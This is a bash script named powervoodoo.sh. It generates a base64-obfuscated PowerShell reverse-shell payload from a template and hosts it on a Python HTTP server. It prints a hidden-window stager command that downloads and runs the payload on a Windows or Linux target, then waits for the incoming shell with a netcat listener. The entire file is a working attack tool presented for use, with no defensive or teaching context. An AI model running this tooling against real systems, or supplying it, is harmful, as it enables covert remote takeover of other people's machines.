#!/usr/bin/bash

usage(){
  echo "usage :"
  echo " powervoodoo.sh <LHOST> <LPORT> <TARGET-OS>"
  echo "e.g : "
  echo " powervoodoo.sh 192.168.1.23 4444 windows"
  echo " powervoodoo.sh 192.168.1.23 4444 linux"
}

function generate_payload {
  lhost=$1
  lport=$2

  echo "[+] generating a payload ..."
  base64_encoded_payload=$(cat payload_templates/payload_template.ps1 | sed "s/LHOST/$lhost/g" | sed "s/LPORT/$lport/g" | iconv -t UTF-16LE | base64 | xargs echo -n | tr -d ' ')
  echo "IEX([system.text.encoding]::unicode.getstring([convert]::frombase64string('$base64_encoded_payload')))" > p.ps1
  echo "[+] payload generated !"
}


function generate_stager {
  target_os=$1
  if [ $target_os = "windows" ];
  then
    stager="powershell.exe -w 1 -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:8000/p.ps1')\""
    echo "[+] run this stager into the target machine : "
    echo
    echo " $stager"
    echo
  elif [ $target_os = "linux" ];
  then
    stager="pwsh -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:8000/p.ps1')\""
    echo "[+] run this stager into the target machine : "
    echo
    echo " $stager"
    echo
  else
    usage
  fi
}


function start_http_server {
  echo "[+] starting http server ..."
  python3 -m http.server &> /dev/null&
  echo "[+] http server started in the background !"
}


if [ $# -eq 3 ];
then
  generate_payload $1 $2
  start_http_server
  generate_stager $3
  echo "[+] starting netcat listener on port [$2]..."
  nc -lnvvp $2

  #terminate the server process when we done
  pkill --echo --full "python3 -m http.server"

else
  usage
fi
